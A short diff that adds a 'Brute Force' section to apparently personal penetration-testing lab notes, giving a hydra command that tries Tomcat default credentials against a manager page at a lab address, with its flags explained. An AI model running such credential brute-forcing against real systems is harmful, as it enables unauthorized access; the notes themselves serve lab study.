@@ -33,6 +33,19 @@ Wordpress scan:
 wpscan -u 10.10.10.10/wp/
 
 
+Brute Force
+===========
+
+HYDRA: 
+
+e.g. password on page running Tomcat: http://10.10.10.95/manager/html: 
+hydra 10.10.10.95 -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get /manager/html -s 8080
+
+-C = username&password are in username:password format
+-s = port 
+
+
+
 Reverse Shells 
 ===============
 
